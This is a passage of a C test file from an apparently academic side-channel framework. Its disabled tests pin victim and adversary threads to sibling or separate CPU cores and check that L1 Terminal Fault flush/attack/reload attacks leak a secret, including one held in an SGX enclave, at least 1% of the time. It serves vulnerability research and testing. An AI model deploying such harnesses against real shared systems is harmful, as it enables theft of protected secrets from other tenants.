 * @return void* always return NULL
 */
void *test_core_cross_thread_l1tf_sgx_is_1_percent_effective_victim_thread(void *arg)
{
    int i;

    (void) arg; /** bypass the warning about unsed parameter */

    for (i = 0; i < REPETITION_TIME * 100; i++)
    {
        ecall_grooming(global_eid, app_filling_sequence, &encalve_secret_buffer, app_clearing_sequence, &app_clearing_buffer, &app_faulting_buffer);
    }

    return NULL;
}

/**
 * @brief The adversary function run by pthread
 *
 * @param arg data passed to the thread function
 * @return void* always return NULL
 */
void *test_core_cross_thread_l1tf_sgx_is_1_percent_effective_adversary_thread(void *arg)
{
    int i;

    (void) arg; /** bypass the warning about unsed parameter */

    for (i = 0; i < REPETITION_TIME; i++)
    {
        // ecall_grooming(global_eid, app_filling_sequence, &encalve_secret_buffer, app_clearing_sequence, &app_clearing_buffer, &app_faulting_buffer);
        flush_enclyser_buffer(&app_encoding_buffer);
        attack(&app_attack_spec, &encalve_secret_buffer, &app_encoding_buffer);
        reload(&app_encoding_buffer, &app_printing_buffer);
    }

    return NULL;
}

/**
 * @brief Test if cross_thread_l1tf_sgx is effective with a successful rate above or equal to 1% for at least 75% offset.
 *
 * @return int 0 if passed, -1 if failed.
 */
int test_core_cross_thread_l1tf_sgx_is_1_percent_effective(void)
{
    int offset, allowance;
    int victim_core, adversary_core;
    pthread_t victim_thread, adversary_thread;
    cpu_set_t victim_cpuset, adversary_cpuset;

    victim_core = 1;
    adversary_core = victim_core + app_sysinfo.nr_cores;

    CPU_ZERO(&victim_cpuset);
    CPU_ZERO(&adversary_cpuset);
    CPU_SET((size_t)victim_core, &victim_cpuset);
    CPU_SET((size_t)adversary_core, &adversary_cpuset);

    allowance = 16;
    for (offset = 0; offset < 64; offset++)
    {
        app_attack_spec.offset = offset;

        ASSERT(!pthread_create(&victim_thread, NULL, test_core_cross_thread_l1tf_sgx_is_1_percent_effective_victim_thread, NULL));
        ASSERT(!pthread_create(&adversary_thread, NULL, test_core_cross_thread_l1tf_sgx_is_1_percent_effective_adversary_thread, NULL));

        ASSERT(!pthread_setaffinity_np(victim_thread, sizeof(cpu_set_t), &victim_cpuset));
        ASSERT(!pthread_setaffinity_np(adversary_thread, sizeof(cpu_set_t), &adversary_cpuset));

        pthread_join(adversary_thread, NULL);
        pthread_join(victim_thread, NULL);

        if (!(app_printing_buffer.buffer[offset + encalve_secret_buffer.value] >= 1 || allowance--))
        {
            // INFO("offset: 0x%x", offset);
            // print(&app_printing_buffer, 0);
            return -1;
        }
        reset(&app_printing_buffer);
    }
    return 0;
}

Test(l1tf, cross_thread_l1tf_sgx_is_1_percent_effective, .disabled = true)
{
    app_attack_spec.major = ATTACK_MAJOR_L1TF;
    app_attack_spec.minor = ATTACK_MINOR_STABLE;

    encalve_secret_buffer.value = 0x1;
    encalve_secret_buffer.order = BUFFER_ORDER_OFFSET_INLINE;
    encalve_secret_buffer.access_ctrl = BUFFER_ACCESS_CTRL_NOT_PRESENT;
    ecall_assign_secret(global_eid, &encalve_secret_buffer);
    cripple_enclyser_buffer(&encalve_secret_buffer);

    app_filling_sequence = FILLING_SEQUENCE_GP_LOAD;
    cr_expect(test_core_cross_thread_l1tf_sgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_GP_LOAD");

    app_filling_sequence = FILLING_SEQUENCE_GP_STORE;
    cr_expect(test_core_cross_thread_l1tf_sgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_GP_STORE");

    app_filling_sequence = FILLING_SEQUENCE_NT_LOAD;
    cr_expect(test_core_cross_thread_l1tf_sgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_NT_LOAD");

    app_filling_sequence = FILLING_SEQUENCE_NT_STORE;
    cr_expect(test_core_cross_thread_l1tf_sgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_NT_STORE");

    app_filling_sequence = FILLING_SEQUENCE_STR_LOAD;
    cr_expect(test_core_cross_thread_l1tf_sgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_STR_LOAD");

    app_filling_sequence = FILLING_SEQUENCE_STR_STORE;
    cr_expect(test_core_cross_thread_l1tf_sgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_STR_STORE");
}

#pragma endregion

#pragma region cross_thread_l1tf_nosgx_is_1_percent_effective

/**
 * @brief The victim function run by pthread
 *
 * @param arg data passed to the thread function
 * @return void* always return NULL
 */
void *test_core_cross_core_l1tf_nosgx_is_1_percent_effective_victim_thread(void *arg)
{
    int i;

    (void) arg; /** bypass the warning about unsed parameter */

    for (i = 0; i < REPETITION_TIME * 100; i++)
    {
        fill_lfb(app_filling_sequence, &app_attaking_buffer);
    }

    return NULL;
}

/**
 * @brief The adversary function run by pthread
 *
 * @param arg data passed to the thread function
 * @return void* always return NULL
 */
void *test_core_cross_core_l1tf_nosgx_is_1_percent_effective_adversary_thread(void *arg)
{
    int i;

    (void) arg; /** bypass the warning about unsed parameter */

    for (i = 0; i < REPETITION_TIME; i++)
    {
        flush_enclyser_buffer(&app_encoding_buffer);
        attack(&app_attack_spec, &app_attaking_buffer, &app_encoding_buffer);
        reload(&app_encoding_buffer, &app_printing_buffer);
    }

    return NULL;
}

/**
 * @brief Test if cross_core_l1tf_nosgx is effective with a successful rate above or equal to 1% for at least 75% offset.
 *
 * @return int 0 if passed, -1 if failed.
 */
int test_core_cross_core_l1tf_nosgx_is_1_percent_effective(void)
{
    int offset, allowance;
    int victim_core, adversary_core;
    pthread_t victim_thread, adversary_thread;
    cpu_set_t victim_cpuset, adversary_cpuset;

    victim_core = 1;
    adversary_core = victim_core + app_sysinfo.nr_cores - 1;

    CPU_ZERO(&victim_cpuset);
    CPU_ZERO(&adversary_cpuset);
    CPU_SET((size_t)victim_core, &victim_cpuset);
    CPU_SET((size_t)adversary_core, &adversary_cpuset);

    allowance = 16;
    for (offset = 0; offset < 64; offset++)
    {
        app_attack_spec.offset = offset;

        ASSERT(!pthread_create(&victim_thread, NULL, test_core_cross_core_l1tf_nosgx_is_1_percent_effective_victim_thread, NULL));
        ASSERT(!pthread_create(&adversary_thread, NULL, test_core_cross_core_l1tf_nosgx_is_1_percent_effective_adversary_thread, NULL));

        ASSERT(!pthread_setaffinity_np(victim_thread, sizeof(cpu_set_t), &victim_cpuset));
        ASSERT(!pthread_setaffinity_np(adversary_thread, sizeof(cpu_set_t), &adversary_cpuset));

        pthread_join(adversary_thread, NULL);
        pthread_join(victim_thread, NULL);

        if (!(app_printing_buffer.buffer[offset + app_attaking_buffer.value] >= 1 || allowance--))
        {
            // INFO("offset: 0x%x", offset);
            // print(&app_printing_buffer, 0);
            return -1;
        }
        reset(&app_printing_buffer);
    }
    return 0;
}

Test(l1tf, cross_core_l1tf_nosgx_is_1_percent_effective, .disabled = true)
{
    app_attack_spec.major = ATTACK_MAJOR_L1TF;
    app_attack_spec.minor = ATTACK_MINOR_STABLE;

    app_attaking_buffer.value = 0x1;
    app_attaking_buffer.order = BUFFER_ORDER_OFFSET_INLINE;
    app_attaking_buffer.access_ctrl = BUFFER_ACCESS_CTRL_NOT_PRESENT;
    assign_enclyser_buffer(&app_attaking_buffer);
    cripple_enclyser_buffer(&app_attaking_buffer);

    app_filling_sequence = FILLING_SEQUENCE_GP_LOAD;
    cr_expect(test_core_cross_core_l1tf_nosgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_GP_LOAD");

    app_filling_sequence = FILLING_SEQUENCE_GP_STORE;
    cr_expect(test_core_cross_core_l1tf_nosgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_GP_STORE");

    app_filling_sequence = FILLING_SEQUENCE_NT_LOAD;
    cr_expect(test_core_cross_core_l1tf_nosgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_NT_LOAD");

    app_filling_sequence = FILLING_SEQUENCE_NT_STORE;
    cr_expect(test_core_cross_core_l1tf_nosgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_NT_STORE");

    app_filling_sequence = FILLING_SEQUENCE_STR_LOAD;
    cr_expect(test_core_cross_core_l1tf_nosgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_STR_LOAD");

    app_filling_sequence = FILLING_SEQUENCE_STR_STORE;
    cr_expect(test_core_cross_core_l1tf_nosgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_STR_STORE");
}

#pragma endregion

#pragma region cross_core_l1tf_sgx_is_1_percent_effective

/**
 * @brief The victim function run by pthread
 *
 * @param arg data passed to the thread function
 * @return void* always return NULL
 */
void *test_core_cross_core_l1tf_sgx_is_1_percent_effective_victim_thread(void *arg)
{
    int i;

    (void) arg; /** bypass the warning about unsed parameter */

    for (i = 0; i < REPETITION_TIME * 100; i++)
    {
        ecall_grooming(global_eid, app_filling_sequence, &app_attaking_buffer, app_clearing_sequence, &app_clearing_buffer, &app_faulting_buffer);
    }

    return NULL;
}

/**
 * @brief The adversary function run by pthread
 *
 * @param arg data passed to the thread function
 * @return void* always return NULL
 */
void *test_core_cross_core_l1tf_sgx_is_1_percent_effective_adversary_thread(void *arg)
{
    int i;

    (void) arg; /** bypass the warning about unsed parameter */

    for (i = 0; i < REPETITION_TIME; i++)
    {
        flush_enclyser_buffer(&app_encoding_buffer);
        attack(&app_attack_spec, &app_attaking_buffer, &app_encoding_buffer);
        reload(&app_encoding_buffer, &app_printing_buffer);
    }

    return NULL;
}

/**
 * @brief Test if cross_core_l1tf_sgx is effective with a successful rate above or equal to 1% for at least 75% offset.
 *
 * @return int 0 if passed, -1 if failed.
 */
int test_core_cross_core_l1tf_sgx_is_1_percent_effective(void)
{
    int offset, allowance;
    int victim_core, adversary_core;
    pthread_t victim_thread, adversary_thread;
    cpu_set_t victim_cpuset, adversary_cpuset;

    victim_core = 1;
    adversary_core = victim_core + app_sysinfo.nr_cores - 1;

    CPU_ZERO(&victim_cpuset);
    CPU_ZERO(&adversary_cpuset);
    CPU_SET((size_t)victim_core, &victim_cpuset);
    CPU_SET((size_t)adversary_core, &adversary_cpuset);

    allowance = 16;
    for (offset = 0; offset < 64; offset++)
    {
        app_attack_spec.offset = offset;

        ASSERT(!pthread_create(&victim_thread, NULL, test_core_cross_core_l1tf_sgx_is_1_percent_effective_victim_thread, NULL));
        ASSERT(!pthread_create(&adversary_thread, NULL, test_core_cross_core_l1tf_sgx_is_1_percent_effective_adversary_thread, NULL));

        ASSERT(!pthread_setaffinity_np(victim_thread, sizeof(cpu_set_t), &victim_cpuset));
        ASSERT(!pthread_setaffinity_np(adversary_thread, sizeof(cpu_set_t), &adversary_cpuset));

        pthread_join(adversary_thread, NULL);
        pthread_join(victim_thread, NULL);

        if (!(app_printing_buffer.buffer[offset + app_attaking_buffer.value] >= 1 || allowance--))
        {
            // INFO("offset: 0x%x", offset);
            // print(&app_printing_buffer, 0);
            return -1;
        }
        reset(&app_printing_buffer);
    }
    return 0;
}

Test(l1tf, cross_core_l1tf_sgx_is_1_percent_effective, .disabled = true)
{
    app_attack_spec.major = ATTACK_MAJOR_L1TF;
    app_attack_spec.minor = ATTACK_MINOR_STABLE;

    app_attaking_buffer.value = 0x1;
    app_attaking_buffer.order = BUFFER_ORDER_OFFSET_INLINE;
    app_attaking_buffer.access_ctrl = BUFFER_ACCESS_CTRL_NOT_PRESENT;
    assign_enclyser_buffer(&app_attaking_buffer);
    cripple_enclyser_buffer(&app_attaking_buffer);

    app_filling_sequence = FILLING_SEQUENCE_GP_LOAD;
    cr_expect(test_core_cross_core_l1tf_sgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_GP_LOAD");

    app_filling_sequence = FILLING_SEQUENCE_GP_STORE;
    cr_expect(test_core_cross_core_l1tf_sgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_GP_STORE");

    app_filling_sequence = FILLING_SEQUENCE_NT_LOAD;
    cr_expect(test_core_cross_core_l1tf_sgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_NT_LOAD");

    app_filling_sequence = FILLING_SEQUENCE_NT_STORE;
    cr_expect(test_core_cross_core_l1tf_sgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_NT_STORE");

    app_filling_sequence = FILLING_SEQUENCE_STR_LOAD;
    cr_expect(test_core_cross_core_l1tf_sgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_STR_LOAD");

    app_filling_sequence = FILLING_SEQUENCE_STR_STORE;
    cr_expect(test_core_cross_core_l1tf_sgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_STR_STORE");
}

#pragma endregion

#pragma endregion
